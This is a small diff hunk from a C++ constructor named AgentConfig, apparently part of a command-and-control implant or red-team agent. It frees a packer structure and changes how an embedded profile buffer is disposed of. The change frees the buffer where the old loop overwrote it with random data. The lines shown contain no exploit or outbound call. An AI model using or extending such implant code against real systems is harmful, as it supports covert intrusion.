@@ -53,6 +53,6 @@ AgentConfig::AgentConfig()
 	this->download_chunk_size = 0x19000;
 
 	MemFreeLocal((LPVOID*)&packer, sizeof(Packer));
-	for (int i = 0; i < size; i++)
-		ProfileBytes[i] = GenerateRandom32();
+	MemFreeLocal((LPVOID*)&ProfileBytes, size);
+
 }
